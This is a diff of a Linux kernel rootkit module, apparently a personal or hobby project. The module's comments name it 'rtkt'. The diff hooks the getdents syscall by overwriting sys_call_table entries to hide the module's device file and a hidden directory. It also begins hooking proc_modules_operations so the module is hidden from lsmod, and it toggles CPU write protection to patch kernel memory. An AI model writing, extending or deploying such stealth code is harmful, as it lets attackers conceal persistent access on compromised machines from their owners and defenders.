@@ -12,6 +12,11 @@ struct linux_dirent {
 	char		d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
 };
 
+void hello(void) {
+	printk("Hello replaced proc read\n");
+}
+
+
 //Test fakeRead
 static asmlinkage int fakegetdents(int fd, struct linux_dirent __user *dirp, unsigned int count) {
 
@@ -29,8 +34,8 @@ static asmlinkage int fakegetdents(int fd, struct linux_dirent __user *dirp, uns
 		entry = (struct linux_dirent *)(dentBuf + iterEnts); //get each entry
 		
 		//we will hide '.' files and rtkt name files
-		if((strncmp(entry->d_name, ".", 1) == 0) ||
-		  strstr(entry->d_name, DEVICE_NAME) != NULL) {
+		if((strcmp(entry->d_name, DEVICE_NAME) == 0) ||
+			strstr(entry->d_name, HIDDEN_DIR) != NULL) {
 			memcpy(dentBuf + iterEnts, dentBuf + iterEnts + entry->d_reclen, ret - (iterEnts + entry->d_reclen)); //copy non hidden files forwards
 			ret-= entry->d_reclen;
 			
@@ -201,26 +206,37 @@ static ssize_t device_write(struct file *filp,
 				write_func(cr4_val);
 				break;
 			}
-		case 3: //Fake process info and usage via syscall hooking 
+		case 3: //Module detection evasion(hide files, hide module from lsmod...)
 			{
 			unsigned long *syscall_table; 
+			struct file_operations* proc_ops;
 			printk("Hooking into sys_calls for general detection evasion\n");
 			/*
-			 1. Hook into openat
-			 2. Check path
-			 3. Hide rtkt file if necessary 
+			 1. Hook into getdents 
+			 2. Filter entries(hides paths)
+		 	 3. Hook into proc_modules_operations -> read	
+			 4. Filter entries(hides modules)
 			 */
-			
-			//Syscall modification test
+
 			syscall_table = (void *)kallsyms_lookup_name("sys_call_table");
+			proc_ops = kallsyms_lookup_name("proc_modules_operations");
 			if(syscall_table == NULL) {
 				printk("Could not find address of sys_call_table\n");
 				return write_bytes;
 			}
+			if(proc_ops == NULL) {
+				printk("Could not find address of proc_modules_operations\n");
+				return write_bytes;
+			}
 
 			//save old read
-			orig_getdents= (typeof(sys_getdents) *)syscall_table[__NR_getdents];
+			orig_getdents = (typeof(sys_getdents) *)syscall_table[__NR_getdents];
 			CRO_WRITE_UNLOCK({ syscall_table[__NR_getdents] = (void *)&fakegetdents; });
+
+			//save old proc_modules_operations->read
+			orig_proc_read = (typeof(seq_read) *) proc_ops->read;
+			//replace read with own version
+
 			break;
 			}
 		case 4: //Fake CPU usage and programs running 
